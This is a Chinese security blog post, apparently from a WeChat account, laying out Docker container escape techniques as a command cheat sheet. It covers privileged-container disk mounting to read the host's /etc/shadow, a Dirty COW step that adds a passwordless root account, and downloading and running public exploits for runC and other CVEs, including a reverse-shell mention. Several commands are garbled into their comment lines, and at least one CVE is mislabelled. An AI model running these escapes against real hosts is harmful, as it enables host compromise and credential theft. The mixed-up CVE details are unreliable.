---
title: docker逃逸方法
url: https://mp.weixin.qq.com/s/AfPBL-qFsnhYBLhtA_rn_w
source: Doonsec's feed
date: 2026-01-31
fetch_date: 2026-02-01T04:22:20.596101
---

# docker逃逸方法

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xr8pIUAaaPupCRLRtF3kN0CU5pNvOummp25Siaw4OU8LCliaxXPllhxvkxzcviaFiabA1ickJAMzSdibnuhJo7eCx0Dg/0?wx_fmt=jpeg)

# docker逃逸方法

小白鱼来了
小白鱼来了

Joker One Security

![]()

在小说阅读器中沉浸阅读

### 特权容器逃逸

**原理**：容器启动时添加`--privileged=true`参数，会获得宿主机的 root 权限，可直接访问宿主机设备文件

在利用特权容器逃逸时先判断该容器是否为特权容器

```
cat /proc/self/status | grep CapEff
```

若命令执行结果是0000003fffffffff 或者是 0000001fffffffff 则可以利用特权模式进行逃逸

```
# 1. 在特权容器内挂载宿主机/proc文件系统（获取设备信息）mount -t proc proc /proc
# 2. 查找宿主机根目录对应的设备（如/dev/sda1）cat /proc/mounts | grep / | head -n1
# 3. 挂载宿主机根目录到容器内mount /dev/sda1 /mnt/host
# 4. 直接访问宿主机文件（如读取/etc/shadow）cat /mnt/host/etc/shadow
```

### 利用内核漏洞逃逸

#### Dirty COW（CVE-2016-5195）

**原理**：Linux 内核`copy-on-write`机制漏洞，允许低权限用户修改只读内存页，突破权限限制

```
# 1. 在容器内编译漏洞利用代码（需gcc环境）wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.cgcc dirtyc0w.c -o dirtyc0w
# 2. 利用漏洞修改宿主机/etc/passwd，添加root用户./dirtyc0w /etc/passwd "hacker::0:0::/root:/bin/bash"
```

#### eBPF 漏洞（CVE-2021-3493）

**原理**：Linux 内核 eBPF 验证机制缺陷，可通过恶意 eBPF 程序执行任意代码

```
# 1. 下载漏洞利用脚本git clone https://github.com/xdavidhu/cve-2021-3493cd cve-2021-3493
# 2. 编译并执行（需内核版本≤5.11）make./cve-2021-3493
```

### runC 漏洞（CVE-2019-5736）

**原理**：runC（Docker 容器运行时）漏洞，允许攻击者替换容器内`/bin/sh`为恶意文件，逃逸到宿主机

```
# 1. 在容器内执行漏洞利用脚本wget https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/main.gogo run main.go
# 2. 脚本执行后，宿主机将执行指定命令（如反弹Shell）
```

### Containerd 逃逸（CVE-2022-24769）

**原理**：Containerd 的`ctr`工具权限配置不当，可通过`ctr`命令创建特权容器

```
# 1. 在容器内执行ctr命令（若宿主机containerd暴露套接字）ctr -n moby run --rm -t --privileged -v /:/mnt/host alpine sh
# 2. 直接访问宿主机文件cat /mnt/host/etc/shadow
```

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/xr8pIUAaaPvbicPEiahNzcLrRLdSUsdibyBlf0tsuuXjTJOzhvPRJEicImhGcuG1cKln6TsY9NtXDkfbsnpnncQf4A/0?wx_fmt=png)

Joker One Security

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/xr8pIUAaaPvbicPEiahNzcLrRLdSUsdibyBlf0tsuuXjTJOzhvPRJEicImhGcuG1cKln6TsY9NtXDkfbsnpnncQf4A/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过